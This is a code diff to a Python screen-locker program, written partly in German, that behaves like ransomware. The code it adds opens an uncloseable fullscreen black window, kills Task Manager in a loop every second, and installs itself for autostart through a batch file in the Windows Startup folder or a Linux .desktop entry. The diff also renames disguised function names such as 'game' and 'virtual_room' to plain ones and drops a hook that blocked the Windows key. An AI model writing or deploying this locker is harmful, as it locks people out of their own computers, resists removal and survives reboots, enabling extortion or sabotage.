@@ -5,17 +5,14 @@ import time
 import threading
 import os
 import sys
+import keyboard
 import shutil
 import getpass
-import keyboard
 
-def cheese(event):
-    if event.name == 'windows' or event.name == 'win':
-        return False
 
 def main():
     root = tk.Tk()
-    root.attributes('-topmost', True)  
+    root.attributes('-topmost', True)  # Immer im Vordergrund
     root.attributes('-fullscreen', True)
     root.configure(bg='black')
 
@@ -23,12 +20,12 @@ def main():
     label.pack(expand=True)
 
     def on_close():
-        pass  
+        pass  # Prevent closing
 
     root.protocol("WM_DELETE_WINDOW", on_close)
 
-    
-    def game():
+    # Funktion zum Blockieren des Task-Managers
+    def block_task_manager():
         while True:
             for proc in psutil.process_iter(['pid', 'name']):
                 if proc.info['name'].lower() in ['taskmgr.exe', 'taskmgr']:
@@ -37,26 +34,38 @@ def main():
                         print("Task Manager process terminated.")
                     except Exception as e:
                         print(f"Error while terminating Task Manager process: {e}")
-            
+            time.sleep(1)
 
-    
-    task_manager_thread = threading.Thread(target=game, daemon=True)
+ 
+    task_manager_thread = threading.Thread(target=block_task_manager, daemon=True)
     task_manager_thread.start()
 
-    keyboard.hook(cheese)
 
     root.mainloop()
 
-def virtual_room():
+def add_to_startup_windows():
+    
+    batch_file_path = os.path.join(os.path.dirname(__file__), "start_main.bat")
+
+    
+    batch_file_content = f"""@echo off
+python "{os.path.abspath(__file__)}"
+"""
+
+    # Batch-Datei erstellen
+    with open(batch_file_path, 'w') as batch_file:
+        batch_file.write(batch_file_content)
+
+    
     username = getpass.getuser()
     startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    batch_file = os.path.join(startup_folder, "start_main.bat")
-    
-    script_path = os.path.abspath(__file__)
-    with open(batch_file, 'w') as f:
-        f.write(f'@echo off\npython "{script_path}"\n')
 
-    print(f"Added {batch_file} to Windows startup.")
+    
+    if not os.path.exists(startup_folder):
+        os.makedirs(startup_folder, exist_ok=True)
+    
+    shutil.copy(batch_file_path, startup_folder)
+    print(f"Added {batch_file_path} to Windows startup.")
 
 def add_to_startup_linux():
     desktop_entry = os.path.expanduser("~/.config/autostart/main.desktop")
@@ -77,7 +86,7 @@ Exec=python3 {script_path}
 
 def setup_autostart():
     if sys.platform.startswith('win'):
-        virtual_room()
+        add_to_startup_windows()
     elif sys.platform.startswith('linux'):
         add_to_startup_linux()
 
